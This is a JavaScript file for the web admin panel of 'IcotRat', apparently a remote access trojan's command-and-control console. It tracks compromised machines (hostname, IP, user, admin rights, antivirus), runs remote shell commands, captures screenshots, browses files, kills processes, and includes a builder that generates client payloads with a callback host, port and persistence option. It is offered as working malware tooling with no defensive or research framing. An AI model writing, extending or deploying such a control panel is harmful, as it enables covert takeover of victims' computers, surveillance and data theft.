// IcotRat Admin Panel JavaScript

// Socket.IO connection
let socket;

// Current client ID for detailed view
let currentClientId = null;

// Initialize the admin panel
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Socket.IO
    initializeSocket();
    
    // Initialize event listeners
    initializeEventListeners();
    
    // Load initial data
    loadDashboardData();
    loadClients();
});

// Initialize Socket.IO connection
function initializeSocket() {
    socket = io();
    
    socket.on('connect', function() {
        console.log('Connected to server');
    });
    
    socket.on('disconnect', function() {
        console.log('Disconnected from server');
    });
    
    socket.on('client_connected', function(data) {
        console.log('Client connected:', data);
        addActivityLog(data.hostname, 'Connected', 'success');
        loadDashboardData();
        loadClients();
    });
    
    socket.on('client_disconnected', function(data) {
        console.log('Client disconnected:', data);
        addActivityLog(data.hostname, 'Disconnected', 'danger');
        loadDashboardData();
        loadClients();
    });
    
    socket.on('command_result', function(data) {
        console.log('Command result:', data);
        addActivityLog(data.client_hostname, `Command: ${data.command}`, data.status);
        
        if (currentClientId === data.client_id) {
            handleCommandResult(data);
        }
    });
}

// Initialize event listeners
function initializeEventListeners() {
    // Dashboard refresh button
    document.getElementById('refresh-dashboard').addEventListener('click', function() {
        loadDashboardData();
    });
    
    // Clients refresh button
    document.getElementById('refresh-clients').addEventListener('click', function() {
        loadClients();
    });
    
    // Tab change event
    document.querySelectorAll('a[data-bs-toggle="tab"]').forEach(tab => {
        tab.addEventListener('shown.bs.tab', function(event) {
            const targetId = event.target.getAttribute('href').substring(1);
            if (targetId === 'clients') {
                loadClients();
            } else if (targetId === 'dashboard') {
                loadDashboardData();
            }
        });
    });

    // Client builder form
    document.getElementById('builder-form').addEventListener('submit', handleBuilderSubmit);
    
    // Shell command execution
    document.getElementById('execute-shell').addEventListener('click', executeShellCommand);
    
    // Screenshot capture
    document.getElementById('capture-screenshot').addEventListener('click', captureScreenshot);
}

// Load dashboard data
function loadDashboardData() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(clients => {
            document.getElementById('total-clients').textContent = clients.length;
            const onlineClients = clients.filter(client => client.online);
            document.getElementById('online-clients').textContent = onlineClients.length;
            
            fetch('/api/stats')
                .then(response => response.json())
                .then(stats => {
                    document.getElementById('commands-sent').textContent = stats.commands_count || 0;
                    document.getElementById('files-transferred').textContent = stats.files_count || 0;
                })
                .catch(error => {
                    console.error('Error fetching stats:', error);
                });
        })
        .catch(error => {
            console.error('Error fetching clients:', error);
        });
    
    fetch('/api/activity')
        .then(response => response.json())
        .then(activities => {
            const activityLog = document.getElementById('activity-log');
            activityLog.innerHTML = '';
            
            if (activities.length === 0) {
                activityLog.innerHTML = '<tr><td colspan="4" class="text-center">No recent activity</td></tr>';
                return;
            }
            
            activities.forEach(activity => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${formatDateTime(activity.timestamp)}</td>
                    <td>${activity.client_hostname}</td>
                    <td>${activity.action}</td>
                    <td><span class="badge bg-${getStatusBadgeClass(activity.status)}">${activity.status}</span></td>
                `;
                activityLog.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error fetching activity:', error);
        });
}

// Load clients list
function loadClients() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(clients => {
            const clientsTable = document.getElementById('clients-table');
            clientsTable.innerHTML = '';
            
            if (clients.length === 0) {
                clientsTable.innerHTML = '<tr><td colspan="9" class="text-center">No clients connected</td></tr>';
                return;
            }
            
            clients.forEach(client => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${client.id.substring(0, 8)}...</td>
                    <td>${client.hostname || 'Unknown'}</td>
                    <td>${client.ip_address || 'Unknown'}</td>
                    <td>${client.os || 'Unknown'}</td>
                    <td>${client.username || 'Unknown'}</td>
                    <td><span class="badge ${client.online ? 'badge-online' : 'badge-offline'}">
                        ${client.online ? 'Online' : 'Offline'}
                    </span></td>
                    <td>${formatDateTime(client.first_seen)}</td>
                    <td>${formatDateTime(client.last_seen)}</td>
                    <td>
                        <button class="btn btn-sm btn-primary btn-action" onclick="viewClient('${client.id}')">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button class="btn btn-sm btn-danger btn-action" onclick="deleteClient('${client.id}')">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                `;
                clientsTable.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error fetching clients:', error);
        });
}

// View client details
function viewClient(clientId) {
    currentClientId = clientId;
    socket.emit('join', { client_id: clientId });
    
    fetch(`/api/clients/${clientId}`)
        .then(response => response.json())
        .then(client => {
            document.getElementById('clientDetailTitle').textContent = 
                `Client: ${client.hostname || 'Unknown'} (${client.ip_address || 'Unknown'})`;
            
            loadSystemInfo(client);
            loadFileExplorer(clientId);
            loadProcesses(clientId);
            
            const clientDetailModal = new bootstrap.Modal(document.getElementById('clientDetailModal'));
            clientDetailModal.show();
            
            document.getElementById('clientDetailModal').addEventListener('hidden.bs.modal', function() {
                socket.emit('leave', { client_id: clientId });
                currentClientId = null;
            }, { once: true });
        })
        .catch(error => {
            console.error('Error fetching client details:', error);
            alert('Failed to load client details');
        });
}

// Load system info tab
function loadSystemInfo(client) {
    const infoTab = document.getElementById('system-info');
    infoTab.innerHTML = `
        <div class="card">
            <div class="card-body">
                <h5 class="card-title">Basic Information</h5>
                <div class="row mb-4">
                    <div class="col-md-6">
                        <p><strong>Hostname:</strong> ${client.hostname || 'Unknown'}</p>
                        <p><strong>IP Address:</strong> ${client.ip_address || 'Unknown'}</p>
                        <p><strong>Operating System:</strong> ${client.os || 'Unknown'}</p>
                        <p><strong>Username:</strong> ${client.username || 'Unknown'}</p>
                    </div>
                    <div class="col-md-6">
                        <p><strong>Admin Rights:</strong> ${client.admin_rights ? 'Yes' : 'No'}</p>
                        <p><strong>Antivirus:</strong> ${client.av_software || 'Unknown'}</p>
                        <p><strong>First Seen:</strong> ${formatDateTime(client.first_seen)}</p>
                        <p><strong>Last Seen:</strong> ${formatDateTime(client.last_seen)}</p>
                    </div>
                </div>
            </div>
        </div>
    `;
}

// Load file explorer
function loadFileExplorer(clientId, path = '') {
    fetch(`/api/clients/${clientId}/files?path=${encodeURIComponent(path)}`)
        .then(response => response.json())
        .then(data => {
            const explorer = document.getElementById('file-explorer');
            explorer.innerHTML = '';
            
            data.files.forEach(file => {
                const item = document.createElement('div');
                item.className = 'file-item';
                item.innerHTML = `
                    <i class="fas ${file.is_directory ? 'fa-folder' : 'fa-file'}"></i>
                    ${file.name}
                    <span class="file-size">${file.is_directory ? '' : file.size}</span>
                `;
                item.onclick = () => file.is_directory && loadFileExplorer(clientId, file.path);
                explorer.appendChild(item);
            });
        })
        .catch(error => {
            console.error('Error loading files:', error);
        });
}

// Load processes
function loadProcesses(clientId) {
    fetch(`/api/clients/${clientId}/processes`)
        .then(response => response.json())
        .then(processes => {
            const processList = document.getElementById('process-list');
            processList.innerHTML = '';
            
            processes.forEach(proc => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${proc.pid}</td>
                    <td>${proc.name}</td>
                    <td>${proc.cpu}%</td>
                    <td>${proc.memory}</td>
                    <td>
                        <button class="btn btn-sm btn-danger btn-action" onclick="killProcess('${clientId}', ${proc.pid})">
                            <i class="fas fa-times"></i>
                        </button>
                    </td>
                `;
                processList.appendChild(row);
            });
        })
        .catch(error => {
            console.error('Error loading processes:', error);
        });
}

// Execute shell command
function executeShellCommand() {
    const command = document.getElementById('shell-input').value;
    if (!command || !currentClientId) return;
    
    socket.emit('execute_command', {
        client_id: currentClientId,
        command: command
    });
    document.getElementById('shell-input').value = '';
}

// Handle command result
function handleCommandResult(data) {
    const shellOutput = document.getElementById('shell-output');
    shellOutput.innerHTML += `<div>${data.output || data.error}</div>`;
    shellOutput.scrollTop = shellOutput.scrollHeight;
}

// Capture screenshot
function captureScreenshot() {
    if (!currentClientId) return;
    
    socket.emit('capture_screenshot', { client_id: currentClientId });
    socket.once('screenshot_result', (data) => {
        const screenshotContainer = document.getElementById('screenshot-container');
        screenshotContainer.innerHTML = `<img src="data:image/png;base64,${data.image}" class="screenshot-img">`;
    });
}

// Handle client builder submission
function handleBuilderSubmit(e) {
    e.preventDefault();
    const host = document.getElementById('host').value;
    const port = document.getElementById('port').value;
    const filename = document.getElementById('filename').value;
    const persistence = document.getElementById('persistence').checked;
    
    fetch('/api/builder', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host, port, filename, persistence })
    })
    .then(response => response.blob())
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        a.remove();
    })
    .catch(error => {
        console.error('Error generating client:', error);
        alert('Failed to generate client');
    });
}

// Delete client
function deleteClient(clientId) {
    if (confirm('Are you sure you want to delete this client?')) {
        fetch(`/api/clients/${clientId}`, { method: 'DELETE' })
            .then(() => {
                loadClients();
                loadDashboardData();
            })
            .catch(error => console.error('Error deleting client:', error));
    }
}

// Utility functions
function formatDateTime(timestamp) {
    return new Date(timestamp).toLocaleString();
}

function getStatusBadgeClass(status) {
    switch(status.toLowerCase()) {
        case 'success': return 'success';
        case 'error': return 'danger';
        default: return 'secondary';
    }
}

function addActivityLog(client, action, status) {
    const activityLog = document.getElementById('activity-log');
    const row = document.createElement('tr');
    row.innerHTML = `
        <td>${formatDateTime(Date.now())}</td>
        <td>${client}</td>
        <td>${action}</td>
        <td><span class="badge bg-${getStatusBadgeClass(status)}">${status}</span></td>
    `;
    activityLog.insertBefore(row, activityLog.firstChild);
    if (activityLog.children.length > 100) {
        activityLog.removeChild(activityLog.lastChild);
    }
}

// Kill process
function killProcess(clientId, pid) {
    if (confirm('Are you sure you want to kill this process?')) {
        socket.emit('kill_process', { client_id: clientId, pid: pid });
    }
}